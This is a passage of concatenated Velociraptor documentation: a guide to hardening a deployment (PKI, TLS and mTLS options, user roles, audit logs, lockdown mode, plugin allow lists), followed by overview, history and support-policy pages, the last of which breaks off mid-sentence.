to secure the deployment as much as possible.

While Velociraptor is designed with security in mind, there are a
number of architectural choices you can make related to security.

In this article we begin with a discussion of the communication
protocol used by Velociraptor and suggest a number of alternative
deployment methods to ensure it can be secured on the network. We then
discuss the Velociraptor permission model and suggest some further
steps to ensure user actions are audited and controlled.

## Velociraptor communications

How do Velociraptor clients communicate with the server? You can read
a lot more details about Velociraptor's encryption scheme and
communication protocol in our [Velociraptor Communications Blog
post]({{< ref
"/blog/2020/2020-09-28-velociraptor-network-communications-30568624043a/_index.md"
>}}), but we will go through the most important aspects here.

### Velociraptor’s internal PKI

Every Velociraptor deployment creates an internal PKI which underpins
it. The configuration wizard create an internal CA with an X509
certificate and a private key. This CA is used to

1. Creating [initial server certificates]({{% ref "/docs/deployment/references/#Frontend.certificate" %}})
   and any additional certificates for key rotation.

2. Verifying the server during client-server communications. [The CA public
   certificate]({{% ref "/docs/deployment/references/#Client.ca_certificate" %}})
   is embedded in the client’s configuration and is used to verify (and therefore trust) the server.

3. Creating API keys for programmatic access. The server is then able to verify
   API clients.

4. Creating client certificates for (optional) mTLS. This allows clients to be
   authenticated using certificates.

The configuration file contains the CA’s X509 certificate in the
`Client.ca_certificate` key (and is therefore included in the client
configuration). The private key is contained in the `CA.private_key` parameter.
Since the client’s configuration contains the (trusted) CA's certificate, it is
able to verify the server's certificate during communications.

The internal CA will be used to verify the different Velociraptor components in
all cases, regardless of whether other TLS certificates are used. While it is
possible to reissue/rotate server certificates the CA certificate can not be
reissued without re-deploying all the clients.

{{% notice warning "Protecting the CA private key" %}}

In a secure installation you should remove the `CA.private_key` section from
the server config and keep it offline. You only need it to
[create new API keys]({{< ref "/docs/server_automation/server_api/#creating-an-api-client-configuration" >}})
and when
[rotating server certificates]({{< ref "/knowledge_base/tips/rolling_certificates/" >}})
(typically after 1 year).
The server does not need it during normal operations.

{{% /notice %}}


### Messages

Clients and servers communicate by sending each other messages (which
are simply protocol buffers), for example, a message may contain VQL
queries or result sets. Messages are collected into a list and sent in
a single POST operation in a **MessageList** protobuf. This protobuf
is encrypted using a session key with a symmetric cipher
(`aes_128_cbc`). The session key is chosen by the sending party and is
written into an encrypted **Cipher** protobuf and sent along with each
message.

![Velociraptor Communication overview](communication_overview.png)

This symmetric key is encoded in a **Cipher Properties** protobuf
which is encrypted in turn using the receiving party’s public key and
signed using the sending party’s private key.

{{% notice tip "Messages are double encrypted" %}}

You might have noticed that **MessageList** protobufs are encrypted
and signed, but they are usually still delivered within a TLS session -
therefore there are two layers of encryption.

The internal encryption scheme's main purpose is not only to encrypt
the messages but to sign them. This prevents messages from one client
from impersonating another client.

{{% /notice %}}

### HTTP protocol

Velociraptor uses HTTPS POST messages to deliver message sets to the
server. The server in turn sends messages to the client in the body of
the POST request. The client connects to one of the server URLs
provided in the **Client.server_urls** setting in its config file.

Before the client communicates with the server, the client must verify
it is actually talking with the correct server. This happens at two
levels:

* If the URL is a HTTPS URL then the TLS connection needs to be
  verified

* The client will fetch the url /server.pem to receive the server’s
  internal certificate. This certificate must be verified by the
  embedded CA.

Note that this verification is essential in order to prevent the
client from accidentally talking with captive portals or MITM proxies.

It is important to understand that the server's internal certificate
is **always** signed by the Velociraptor internal CA and is **always**
named with the name `VelociraptorServer`. It is completely
independent of the TLS certificates that control the HTTPS
connection (which may be external certificates).

The client will **always** verify the internal server certificate in
order to decrypt the messages as described above. This means that even
when a MITM proxy is able to decode the HTTPS connections, there is no
visible plain text due to the included messages being encrypted again
by the internal server certificate.

## Securing Network communications

The following are some common network deployment scenarios. Simple
scenarios are covered by the configuration generation wizard, but for
more complex scenarios you will need to tweak the configuration file
after generating it.

### Self-signed deployment

This is the simplest deployment scenario handled by the configuration
wizard.

When deploying in self-signed mode, Velociraptor will use its internal
CA to general TLS certificates as well. The TLS server certificate
will be generated with the common name `VelociraptorServer` and be
signed with the Velociraptor internal CA:

1. The setting `Client.use_self_signed_ssl` will be set to true. This
   causes the client to **require** that the server certificate have a
   common name of `VelociraptorServer` and it **must** be verified by
   the embedded CA certificate in `Client.ca_certificate`.

   This essentially pins the server’s certificate in the client — even
   if a MITM attacker was able to mint another certificate (even if it
   was trusted by the global roots!) it would not be valid since it
   was not issued by Velociraptor’s internal CA which is the only CA
   we trust in this mode! In this way self-signed mode is more secure
   than when using a public CA.

   This mode also has the server use the `VelociraptorServer` internal
   certificate for securing the HTTPS connection as well.

2. The GUI is also served using self-signed certificates which will
   generally result in a browser SSL warning. To avoid a MITM attack
   on a browser the GUI is forced to only bind to the localhost in
   this configuration. For increased security we recommend using the
   GUI using SSH to tunnel the connections into the localhost:

   ```sh
   ssh user@velociraptor.server -L 8889:127.0.0.1:8889
   ```

   Now use your browser on https://127.0.0.1:8889/ on your port
   forwarded workstation.

   Alternatively you can decide to expose the GUI on the public
   interface by changing the server configuration file:

   ```yaml
   GUI:
     bind_address: 0.0.0.0
     bind_port: 8889
   ```

   In this configuration you may use standard port filtering or
   firewalls to restrict access to the GUI port while allowing clients
   to connect freely to the frontend port (since these can be
   different ports).

### Deployment signed by Let's encrypt

The next deployment scenario handled by the configuration wizard uses
Let's encrypt to automatically assign certificates to the HTTPS TLS
connections.

In this scenario, the server will request Let's Encrypt to mint
certificates for the domain name provided. In order to this to work,
Let's Encrypt will go through a verification protocol requiring one of
their servers to connect to the Velociraptor server over port 80 and
443.

Therefore, the server needs to be reachable over ports 80 and 443 (You
can not serve over a non standard SSL port with Let's Encrypt).

{{% notice warning "Filtering ports" %}}

If you filter port 80 from the internet then Let's Encrypt will be
unable to verify the domain and will likely blacklist the domain name
for a period.

It is crucial that port 80 and 443 be unfiltered to the world. It is
difficult to recover from a blacklisting event other than waiting for
a long period of time.

{{% /notice %}}

In this configuration:

1. The `Client.use_self_signed_ssl` is switched off. This tells the
   client that it should verify the TLS connection using public root
   CA's.

2. The GUI is configured to bind to all interfaces as above. This is
   required to allow connections from the Let's Encrypt servers.

In this scenario the GUI must share the same port as the frontend
because the TLS certificate can only be issued to port 443. This means
that the GUI is accessible from the world as it is sharing the same
port as the frontend service and we can not use traditional port
filtering to restrict access.


### Deployment with TLS certificates signed by external CA

This is a common scenario where there is an SSL inspection proxy
between the client and server communications. In this case the proxy
will present a certificate for the server signed by another CA
(usually an internal self-signed CA associated with the inspection
software).

Alternatively you may choose to buy TLS certificates from a commercial
CA (this use case is very similar).

In this scenario, the client needs to verify the TLS connections using this custom CA certificate:

1. From the client's point of view it is not in self-signed mode,
   because Velociraptor itself did not issue this certificate,
   therefore `Client.use_self_signed_ssl` should be false.

2. Additionally the certificate should be verified using the
   inspection CA's certificate. Therefore that certificate should be
   added to `Client.Crypto.root_certs`:

   ```yaml
   Client:
      Crypto:
         root_certs: |
            -----BEGIN CERTIFICATE-----
            <certificate 1>
            -----END CERTIFICATE-----
            -----BEGIN CERTIFICATE-----
            <certificate 2>
            -----END CERTIFICATE-----
   ```

3. The server may need to present custom certificates. Add those to
   the Frontend section (Certificates need to be in PEM format with
   unencrypted private keys to allow the server to start without user
   interaction):

   ```yaml
   Frontend:
       tls_certificate_filename: /etc/cert.pem
       tls_private_key_filename /etc/cert.key
   ```

   Do not change the `Frontend.certificate` field as Velociraptor will
   still require to verify the server using it's own CA.

   Note that only the TLS communications will be visible to the TLS
   interception proxy. It will be unable to see any clear text since
   there are always two layers of encryption.

### Restricting access to the GUI from IP blocks

If your users normally access the GUI from a predictable
network IP block you can add a list of network addresses in the
[GUI.allowed_cidr]({{% ref
"/docs/deployment/references/#GUI.allowed_cidr" %}}) part of the
config file. This setting will automatically reject connections to the
GUI applications from IP addresses outside the allowed range.

### Deploying mTLS authentication

An additional layer of security can be provided by enabling
Mutual TLS (mTLS) authentication between clients and server.
This mechanism requires the client to present a valid client certificate before
the server even allows a connection to the frontend. The client certificate is
included in the client configuration file.

Although clients cannot enroll or communicate without a valid configuration
file, it is possible to connect and fingerprint the server if the mTLS policy is
not enabled. For servers exposed to the public internet this may be undesirable
even though this doesn't present any substantial risk.

mTLS provides an additional layer of security in that connections from the
internet (from clients or non-clients) to the frontend are required to present a
valid certificate in order to complete the TLS connection.

To implement this strategy you need to:

1. Generate client-side certificates signed by the internal Velociraptor CA.
2. Specify that the frontend requires the client to present a valid
   client side certificate signed by the internal Velociraptor CA.

#### Generating client side certificates

The client side certificate is just a certificate signed by the internal CA. The
server will verify the validity of the client certificate but does not track
issued certificates or provide a CRL mechanism. The client certificate is not
used to individually identify clients, so we only need to issue one certificate
that allows us to verify all clients. All clients will present the
same certificate when connecting.

Since the certificate needed is the same as an API client certificate, we can
use the same process to generate one for mTLS:

```
$ velociraptor --config /etc/velociraptor/server.config.yaml config api_client --name "Client" /tmp/dummy.api.config.yaml
Creating API client file on /tmp/dummy.api.config.yaml.
No role added to user Client. You will need to do this later using the 'acl grant' command.
```

{{% notice warning "API User permissions" %}}

This will create an API configuration file for an API user called "Client",
containing the key pair that we need. However the `config api_client` command
shown above will not actually create a user on the Velociraptor server since we
deliberately didn't specify the `--role` flag.

It is critical that the user has no roles or permissions on the server to
prevent this key from being used to connect to the API ports. Therefore the
message concerning the use the `acl_grant` command shown above
_should NOT be followed_.

{{% /notice %}}

Once the key is generated you can see it in the resulting yaml file encoded in
PEM format. Simply copy the two blocks - `client_private_key` and
`client_cert` - into the client's config file
[Client.Crypto.client_certificate]({{% ref "/docs/deployment/references/#Client.Crypto.client_certificate" %}})
and [Client.Crypto.client_certificate_private_key]({{% ref "/docs/deployment/references/#Client.Crypto.client_certificate_private_key" %}}),
or into the server config if you intend to use the GUI to repack the MSI or
generate client configs for multiple orgs (service restart will be required to
read these new config items).

```yaml
Client:
   Crypto:
      client_certificate: |
        -----BEGIN CERTIFICATE-----
        <certificate>
        -----END CERTIFICATE-----
      client_certificate_private_key: |
        -----BEGIN RSA PRIVATE KEY-----
        <key>
        -----END RSA PRIVATE KEY-----
```

Note that this client certificate will only be used if the server requests it,
so it is fine to add the client certificate to the client config even if you
only intend to enable mTLS later.

{{% notice info %}}

Client certificates generated as described above will be valid for 1 year. It is
highly likely that you will upgrade your clients before this 1-year period
elapses and so we recommended that you issue a new client cert during the
upgrade process by including an updated (i.e. with a new client cert) client
config in your client package, for example MSI for Windows clients.

{{% /notice %}}

#### Requiring client side certificates

On the server you can require frontend connections to present valid
client side certificates by setting the
[Frontend.require_client_certificates]({{% ref
"/docs/deployment/references/#Frontend.require_client_certificates"
%}}) to true.

Once this setting is made it will not be possible to connect to the
frontend without presenting a relevant client side certificate. This
makes troubleshooting a bit more challenging.

For example the following will fail:

```sh
$ curl -k https://127.0.0.1:8000/server.pem
curl: (56) OpenSSL SSL_read: error:0A000412:SSL routines::sslv3 alert bad certificate, errno 0
```

To allow curl to connect you will need to create a PEM file with both
the certificate and the private key in it (Copied from the YAML files
above):

```
-----BEGIN CERTIFICATE-----
....
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
....
-----END RSA PRIVATE KEY-----
```

Now we can use curl to connect successfully

```sh
curl -k https://127.0.0.1:8000/server.pem --cert /tmp/client.pem | openssl x509 -text
```

## Securing the server

In the following sections we discuss how the GUI application can be
further secured. Since Velociraptor commands such privileged access to
the network it is important to ensure this access can not be misused.

### GUI Users

Velociraptor's GUI is the nerve center for managing a Velociraptor
deployment so we need to ensure we secure it with proper user
authentication. Within Velociraptor, the user is central and is
associated with a set if roles and permissions which control what the
user is able to do.

Users and permissions are managed in the GUI's `Users` screen (which
is visible to administrators)

![Managing User Permissions](user_management.png)

Velociraptor offers a number of options to authenticate users into the
GUI. The type of authenticator is specified in the
[GUI.authenticator.type]({{% ref
"/docs/deployment/references/#GUI.authenticator.type" %}})
setting. The config wizard supports some basic authenticators but
others have to be manually configured.

To make deployment easier the configuration wizard supports creating
`Initial Users`. These user accounts will be created automatically
when the server starts upon first installation and be given the administrator role.

This provides a way to bootstrap the administrator into the server. If
the `Basic` authentication method is specified, the password hashes
and salt will be initialized from the configuration file. For other
authentication methods that do not use passwords, the password hashes
are ignored.

```yaml
GUI:
  initial_users:
  - name: mic
    password_hash: aa3a779......
    password_salt: f8707a7......
```

#### Adding a new user

To add a new user, the GUI can be used by clicking on the `+` icon and
setting a user name.

![Adding a new user](user_adding.png)

By default the user is added to the selected org with the `Read Only`
role. You can assign the new user to any number of orgs using the GUI

![Assign a new user to orgs](user_assign_org.png)

#### Roles and permissions

Velociraptor users are assigned various permissions to control their
actions in different `Orgs`. To make it easier to deal with a group of
permissions, Velociraptor has the concept of a `role` which can be
thought of as just a predefined set of permissions.

The actual permission check is made against the set of permissions
the user has. Assigning a role to a user gives them a set of
permissions, but you can also assign permissions separately.

![Assign Roles and Permissions to a user](user_assign_roles.png)

In the above screenshot we see the `testuser` has the read only role
which allows them to read already collected results from
clients. Additionally we also gave them the `Label Clients` permission
so they can assign labels to different clients (potentially affecting
their membership in hunts).

User roles and permissions extend far beyond the GUI itself
though. Since Velociraptor is really a VQL engine and provides
powerful capabilities for automation and post processing via
notebooks, the VQL engine itself respects the user's permissions.

Therefore while the VQL query is executed the user's permissions are
checked against the different VQL plugins and functions, and if the
user does not have permissions to run these, the plugin will be
prevented from running.

![User permissions are checked in notebook evaluation](VQL_permissions.png)

In the above screenshot, the `testuser` user attempted to run the
`SELECT * FROM info()` plugin but that plugin requires the
`MACHINE_STATE` permission (because it inspects properties of the
server like hostname etc). Therefore the plugin will be rejected and
an error log emitted.

However the user may still run other plugins like the `hunt_results()`
plugin to inspect results (because the user has the read permission).

You can check which permission each plugin requires in the reference
site's `VQL Reference` section.

![Inspecting VQL plugin permissions](VQL_permissions_reference.png)

{{% notice warning "Selecting User permissions" %}}

While you can have very fine control over the user's roles and
permissions we suggest that you stick to the built in roles and they
way they should be used as much as possible.

This is because sometimes there are unexpected escalation paths
between permissions that you might not be aware of. For example,
giving a user the `Server Artifact Writer` role can easily lead to
privilege escalation as the user can modify an existing server
artifact to run VQL to grant them other roles, and trick an
administrator in running that artifact.

This is why we say that some roles are "Administrator Equivalent"
because it is easy to escalate from them to more powerful
roles. Typically we try to limit access to trusted users anyway and
not rely too much on the user roles.

{{% /notice %}}

### Auditing User actions

Some actions in the UI (Or in VQL notebooks) are important for server
security. We call these actions `Auditable Actions` because we want to
report them taking place.

Velociraptor records auditable actions in two ways:
1. The Audit log is written to the audit directory
2. The Audit event is written to the `Server.Audit.Logs` event artifact.

This allows events to be recorded and **also** be automatically acted
upon with a server event query using the `watch_monitoring()` plugin.

You can forward server event logs to a remote syslog server by setting
the value in the [Logging.remote_syslog_server]({{% ref
"/docs/deployment/references/#Logging.remote_syslog_server" %}}) part
of the config. We recommend this be done to archive audit logs.

However, much more interestingly, Velociraptor treats server audit
events as simply another event query called
`Server.Audit.Logs`. Therefore you can view it as just another server
event artifact in the GUI.

![Viewing server audit logs](viewing_audit_logs.png)

The audit event is divided into fixed fields (`ServerTime`,
`operation` and `principal`) and a variable column `details` with a
per event data.

By having the data recorded as a timed artifact we can apply filtering
etc using the notebook. The below query isolates only administrator
actions within the time of interest.

![Querying audit logs within the Velociraptor GUI](querying_audit_logs.png)

Additionally it is possible to forward audit events to external
systems. For example, `Elastic.Events.Upload` can forward audit events
to Elastic, while `Server.Alerts.Notification` can forward these to a
slack channel.

### Authenticating the user

Users can be authenticated using a variety of ways, including Active
Directory, Client Certificates, Multi-Factor Authentication
etc. Velociraptor offers a number of different `authenticators` to
allow flexibility with authenticating users.

#### Basic Authentication

The simplest authentication is `Basic` authentication. In this mode,
the GUI requires the user to provide a username and password using the
HTTP `Basic` Authentication mode. While these credentials are
typically encrypted using HTTPS in transit, basic authentication is
not considered secure and should be avoided because Velociraptor
itself has to manage the passwords.

Velociraptor will store the password hashes and salts in the filestore
for each user and verify them on each HTTP request.

When basic authentication is configured, a user can update their own
password using the GUI

![Updating a user's own password](updating_own_password.png)

Sometimes administrators need to update another user's password. This
can be done from the user management screen.

![Updating another user's password](updating_user_password.png)

Note that password management is supposed to be very simplistic
because for production servers we recommend to use an external
authentication service (e.g. OIDC)

#### OAuth2 services

A number of public identity providers are directly supported in
Velociraptor and based on OAuth2 protocol.

You can read more about setting up [GitHub, Azure and Google]({{% ref "/blog/2020/2020-08-17-velociraptor-sso-authentication-6dd68d46dccf/" %}}) as an OAuth2 provider.


### Lock down mode

Many users use Velociraptor for incident response purposes and
collecting telemetry. While it is convenient to have Velociraptor
already deployed and active in the environment, this may increase the
risk for misuse when not used for response.

For this purpose Velociraptor has a "lockdown mode". This mode
prevents Velociraptor from performing any active modification to the
environment.

This is implemented by denying all users from certain powerful
permissions - even if the user is an administrator!

The following permissions are denied while in lockdown mode

* `ARTIFACT_WRITER`
* `SERVER_ARTIFACT_WRITER`
* `EXECVE`
* `SERVER_ADMIN`
* `FILESYSTEM_WRITE`
* `FILESYSTEM_READ`
* `MACHINE_STATE`

After initial deployment and configuration, the administrator can set
the server in lockdown by adding the following configuration directive
to the `server.config.yaml` and restarting the server:

```yaml
lockdown: true
```

Therefore it will still be possible to read existing collections, and
continue collecting client monitoring data but not edit artifacts or
start new hunts or collections.

During an active IR the server may be taken out of lockdown by
removing the directive from the configuration file and restarting the
service. Usually the configuration file is only writable by root and
the Velociraptor server process is running as a low privilege account
which can not write to the config file. This combination makes it
difficult for a compromised Velociraptor administrator account to
remove the lockdown and use Velociraptor as a lateral movement
vehicle.

### Preventing new client enrollments

By default, new clients can enroll at any time if they have a valid client
configuration file. Normally this is what you'd want because you may be using a
client distribution method that provides ongoing deployment of new clients.

In some circumstances you may wish to suspend client deployment. For example, if
you have decided that all intended clients are deployed and that your deployment
phase is over then you may choose to switch to a more strict deployment process
to ensure that rogue clients cannot be enrolled. This is unusual but in
high-security environments it may be a requirement. By "rogue client" we mean
any client deployed outside of an approved process, regardless of whether the
intention is benign or not - it could just be that you want to ensure that the
IT department doesn't accidentally deploy new clients beyond a certain point.

To ensure that no new clients can enroll, you can set the value of the
[`Frontend.resources.enrollments_per_second`]({{< ref "/docs/deployment/references/#Frontend.resources.enrollments_per_second" >}})
configuration key to `-1`.

As with all server config changes, this will require a service restart. To
reverse this policy you can either remove the config key or comment it out to
resume accepting client enrollments.

### Removing plugins from a shared server

While Velociraptor allows user to run arbitrary VQL in notebooks it
does control access to the things that the queries can do by applying
a user's ACL token to each plugin.

This means that administrators are typically allowed to run all
plugins, even those that might compromise the server (e.g. the
`execve()` plugin can run arbitrary shell commands!)

For shared server environments it is better to prevent these plugins
from running at all - even for administrators.

Velociraptor allows the configuration file to specify which VQL plugins are allowed using the [defaults.allowed_plugins]({{% ref "/docs/deployment/references/#defaults.allowed_plugins" %}}), [defaults.allowed_functions]({{% ref "/docs/deployment/references/#defaults.allowed_functions" %}}) and [defaults.allowed_accessors]({{% ref "/docs/deployment/references/#defaults.allowed_accessors" %}})

The easiest way to populate these is to answer Yes to `Do you want to
restrict VQL functionality on the server?` in the configuration
wizard. This will implement the [default allow
list](https://github.com/Velocidex/velociraptor/blob/master/bin/allowlist.go)
(which you can tweak later as required).

If these lists are populated, only the plugins mentioned are allowed
to be registered at all. This results in an error message like `Plugin
Info Not Found` when the plugin is used.

The purpose of this security measure is to completely remove
functionality from the server, regardless of the permissions model. It
is only needed when the server is shared between potentially untrusted
users. Usually you should not implement this because it causes a lot
of functionality to randomly break (e.g. any artifacts that might
depend on a plugin which is not in the allow list will fail).

## Securing VQL

Velociraptor uses VQL extensively in the form of [artifacts]({{% ref
"/docs/artifacts/" %}}) and [notebooks]({{% ref
"/docs/notebooks" %}}). Since a VQL query can do many potentially
dangerous actions, it is important to restrict the type of actions the
query can perform based on the user's ACL token. When the VQL query is
started, the user's ACL token is loaded into the query environment. As
the query continues executing, various VQL plugins and functions are
evaluated by the VQL engine. VQL plugins and functions may have
requirements as to the type of permission required to run. You can see
the required permission for each plugin in the [VQL reference]({{% ref
"/vql_reference" %}}) page.

![Example VQL reference showing required permissions](vql_reference.png)

This mechanism allows lower privilege users to run VQL safely - those
actions that require permissions the user does not have will simply be
ignored (and a log message emitted).

ACL checks are always enforced on the server, for example in notebooks
and server artifacts. A user with the `Analyst`role, has no
`FILESYSTEM_READ` permission, and therefore if they tried to run a
`glob()` based query in a notebook they will be denied.

![Permission denied error in the notebook](notebook_permission_denied.png)

### Controlling access to artifacts

While ACL checks are enforced on the server, on the client all ACL
checks are disabled. This means that as long as a user is able to
schedule the collection on the client, the collection can do anything
at all. This makes sense as we want the VQL to be evaluated the same
way regardless of who launched the collection in the first place.

However this may give lower privilege users a lot of power over the
entire network. For example the artifact
[Windows.System.PowerShell]({{< ref "/artifact_references/pages/windows.system.powershell/" >}}) allows
running arbitrary shell commands on the endpoint. While this is a
useful capability in limited situations it may lead to severe
compromise if misused!

Velociraptor allows for an artifact to specify the
`required_permissions` field.

```yaml
name: Windows.System.PowerShell
description: |
  This artifact allows running arbitrary commands through the system
    powershell.
  ....
required_permissions:
  - EXECVE
```

This field specifies that the server check the user has all of the
required permissions before the server allows the artifact to be
scheduled. If a user with the `Investigator` role tries to launch this
artifact, they will be denied (since the usually lack the `EXECVE`
permission)

![Permission denied launching a powerful artifact](launch_artifact_permission_denied.png)

Typically we set the `required_permissions` field on client artifacts
that can do dangerous things if misused. In particular, if the
artifact parameter can specify running arbitrary code.

{{% notice tip "Delegating artifact permissions" %}}

The `required_permissions` check is only done on the artifact being
launched. It does not apply to any dependent artifacts called from the
launched artifact. This is deliberate as it allows you to create
curated safe versions of the dangerous artifacts to be used by lower
privilege users. For example, while `Windows.System.PowerShell`
requires an `EXECVE` permission because its parameter allows arbitrary
commands to run, we can wrap it with a safe version:

```yaml
name: Custom.SafePowershellDir
sources:
  - query: |
        SELECT * FROM Artifact.Windows.System.PowerShell(Command="dir C:/")
```

This artifact can not be misused because the command passed to
`Windows.System.PowerShell` is a fixed string and can not be changed
by the user that initiates the collection.


{{% /notice %}}

---END OF FILE---

======
FILE: /content/docs/overview/_index.md
======
+++
title = "Velociraptor Overview"
date = 2021-06-09T02:33:37Z
weight = 5
chapter = false
+++

Velociraptor is a unique, advanced open-source endpoint monitoring,
digital forensic and cyber response platform.

It was developed by Digital Forensic and Incident Response (DFIR) professionals who needed a
powerful and efficient way to hunt for specific artifacts and monitor activities across
fleets of endpoints. Velociraptor provides you with the ability to more effectively respond to a wide range of digital
forensic and cyber incident response investigations and data breaches:

* Reconstruct attacker activities through digital forensic analysis
* Hunt for evidence of sophisticated adversaries
* Investigate malware outbreaks and other suspicious network activities
* Monitory continuously for suspicious user activities, such as files
  copied to USB devices
* Discover whether disclosure of confidential information occurred outside the network
* Gather endpoint data over time for use in threat hunting and
  future investigations


## VQL - the Velociraptor difference

Velociraptor's power and flexibility comes from the Velociraptor Query
Language (VQL). VQL is a framework for creating highly customized
**artifacts**, which allow you to collect, query, and monitor almost
any aspect of an endpoint, groups of endpoints, or an entire
network. It can also be used to create continuous monitoring rules on
the endpoint, as well as automate tasks on the server.

![Rocket Velociraptor](media/image4.png)

## The Velociraptor Philosophy

Traditional DFIR procedures typically follow the following high level
phases:

1. `Acquisition`: In this phase the investigator collects all the raw
   data for example, memory or disk images.
2. `Post Processing`: In this phase the investigator runs various
   scripts and tools to extract high level information from the raw
   data.
3. `Analysis and Reporting`: In this phase the investigator looks
   through the data reported in the previous step and extract
   information relevant to the specific case.

When experienced DFIR professionals are first introduced to
Velociraptor, they proceed to use it this traditional
workflow. However, they soon find out that this process simply does
not scale and it is not effective. For example, acquiring a basic
triage collection (`$MFT`, event logs, USN Journal etc) might be
several Gb in size. This size is manageable for one or a few hosts,
but collecting these across 100,000 hosts is simply not viable!

Velociraptor's philosophy is different: We treat the source of truth
as the actual endpoints. We then pose targeted queries of these
endpoints aiming to directly progress the investigation.

> Rather than collecting all the data into a central location and then
> running queries on that, we push the queries to the endpoints and
> parse artifacts directly on the endpoint itself.

When reading the rest of the documentation on this site, bear in mind
the following:

1. Queries should be targeted and return high value data if possible.
   * E.g. instead of collecting all event logs, use targeted
     Sigma rules to highlight only important events.

2. Aim to reduce the amount of post processing on the server as much
   as possible.
   * E.g. Instead of parsing the `$MFT` on the endpoint and then
     filtering it on the server for the time range of interest,
     directly time box the MFT on the endpoint to only deliver
     relevant files.

3. Think about why you want to collect a certain artifact, not what
   the artifact is and how to parse it.

## Documentation overview

The site is divided into the following parts

- [Deployment]({{< relref "../deployment/" >}}) where you will learn the different deployment options.

- [GUI Tour]({{< relref "../gui/" >}}) provides a tour of the user interface.

- [VQL Fundamentals]({{< relref "../vql/" >}}) provide a deep dive into VQL and how to write your own artifacts and queries.

---END OF FILE---

======
FILE: /content/docs/overview/history/_index.md
======
---
title: "History"
date: 2021-06-09T03:51:18Z
draft: false
weight: 1
---

Velociraptor draws its inspiration from two major open source projects:

* Google Rapid Response:  https://github.com/google/grr
* OSQuery: https://github.com/osquery/osquery


If you used either of these projects you might wonder how Velociraptor compares to the work that was done before
it.

Let's look at the major design differences and priorities of Velociraptor, GRR, and OSQuery.


### Velociraptor vs Google Rapid Response

Google's Rapid Response (GRR) launched in 2011, and was one of the first tools to allow hunting for forensic artifacts at scale.
GRR allowed investigators to quickly query network hosts to check files or registry settings. Rather than passively analyse logs that after they were collected into a central location, GRR allowed security professionals to proactively search for evidence of compromise
across many hosts.

One of the challenges of remotely accessing machines at scale is
that many endpoints are not online when investigators need to
access them. GRR allows for "Flows" to be scheduled in advance so that evidence is automatically collected
when the endpoint comes back online.

GRR and Velociraptor both refer to the process of simultaneously collecting the same file or registry key from
many machines as a "hunt".

Velociraptor also provides asynchronous
collection of "artifacts" from multiple hosts in a similar way. However, Velociraptor artifacts do more than collect
files or registry keys. Velociraptor can perform
sophisticated analysis on the endpoint to surface novel adversary
techniques and detect malicious activity quickly and with precision.

Another aspect where Velociraptor differs from GRR is in it's ease of
use and deployment. While GRR requires a complex deployment with many
moving parts, Velociraptor is a single statically compiled executable
written in Go. Velociraptor is also much faster than GRR and has a
much lower memory/CPU footprint on the endpoint. A single
Velociraptor server can handle over 10,000 endpoint network easily,
and can be installed in a few minutes on modest hardware.

GRR primarily collects files and registry keys from the endpoint, with
minimal parsing capability on the endpoint, preferring instead of
parse files on the server. Velociraptor's philosophy is to push as
much of the parsing and analysis to the endpoint as
possible. Velociraptor contains many powerful forensic analysis modules
on the endpoint, and uses a powerful query language allowing new parsers to
be written. This allows endpoints
to send only the most relevant results and reduces
unnecessary parsing on the server.

### Velociraptor vs OSQuery

OSQuery was really the first popular example of an open source tool
that provided a query langauge to allow querying the endpoints. This
capability allows users to target specific queries in a flexible way
to address new threats or find new IOCs, making it a popular choice
among defenders.

The main limitation with OSQuery is that it uses SQL, a language that is designed for databases and not to query dynamic
endpoint state. There are limitations in SQL expressions that impact its ability to build concise and flexible
queries. While simple SQL is easy for beginners to learn, more
sophisticated queries use SQL contracts that are a pretty complex, such as JOIN operators.

Velociraptor's VQL also allows users to flexibly
write new queries to gather new evidence on the endpoint. However, VQL
is deliberately kept very simple, yet powerfully expressive.

Additionally, OSQuery suffers from performance issues. Finding files using queries against the "file" table are notoriously
expensive. Velociraptor is typically much faster than OSQuery and
uses much less memory.

Finally, OSQuery by itself is not sufficient to monitor a large network
since OSQuery does not include any kind of client/server orchestration
or GUI. A complete solution requires users to install another tool (such as [FleetDM](https://github.com/fleetdm/fleet)) to use
OSQuery, increasing complexity and management overhead.

---END OF FILE---

======
FILE: /content/docs/overview/support/_index.md
======
---
menutitle: "Support Policy"
title: "The Velociraptor Support Policy"
weight: 10
draft: false
---

While Velociraptor is an open source project, we do take the security
and stability of the project very seriously.

This page sets out our policy for ongoing support and our testing
regime. This should help to set expectations of what features and
specific configurations are supported by the core Velociraptor team.

Ultimately, Velociraptor is an open source project maintained and run
by the community. We depend on bug reports and testing by the
community to support and maintain the project. If you find a bug or a
feature which does not work quite as expected, please file an issue on
[our GitHub Issue
Tracker](https://github.com/Velocidex/velociraptor/issues) with steps
to help us reproduce it!

## The Release process

Velociraptor release numbers follow [semantic versioning](https://semver.org/)
(e.g. 0.74.1). Currently our major version is 0, meaning that we do not
consider the public API to be stable in relation to interoperability
with older or future versions.

Our development occurs against the GitHub master branch and
periodically we prepare a new release by following this process:

1. A release branch is prepared from master with a name reflecting the
   release number (e.g. v0.74-release)
2. No more new features are committed to this branch - it is in
   feature freeze.
3. A release candidate (RC) is prepared and binaries for our supported
   operating systems are published to GitHub
4. The RC remains in pre-release for a minimum of 2 weeks while we
   receive feedback from the community. We encourage everyone to test
   the RC on their infrastructure in order to flag any issue that
   should be addressed before the main release.
5. Once a release is qualified, we create a final build and release at
   that version.

If bugs are identified after the release that are deemed critical, we
may back port these bugs to the last release branch and make a revised
patched release at that version (e.g. v0.73.2). We generally do not
update any previous releases older than the current release.


## Client and Server versioning

Velociraptor has two major components, the client and server. Clients
are typically deployed widely across a large number of endpoints, and
are sometimes difficult to upgrade in a timely manner. Nevertheless,
we highly recommend that client versions are kept up to date since any
bug fixes and new features become available with later versions.

The Velociraptor team only tests compatible versions of client and
server thoroughly (in our CI pipeline). The most supported
configuration is when the client and server versions match exactly
(e.g. a 0.74.1 server communicating with a 0.74.1 client).

Nevertheless we do attempt to achieve compatibility between the latest
version of the server and recent clients, however this is done on a
best effort basis. Usually compatibility issues surface in the
following ways:

1. The newer server may contain artifacts that reference functionality
   not present in the older clients - therefore they are unable to
   collect those specific artifacts.
2. The newer server may use existing functionality in a way that is
   not compatible with older clients (e.g. a new parameter to a plugin
   used by a new artifact version). There may be possible workarounds
   as advised by the Velociraptor team, so please seek advice if you
   need to collect these artifacts with older clients. (e.g. sometimes
   by manually modifying the VQL it is possible to achieve
   compatibility with older clients).
3. Something has changed with the way the communication between client
   and server is implemented and the newer server is completely unable
   to communicate with the older clients at all. This condition is
   rare and we actively try to avoid it, but may happen if the version
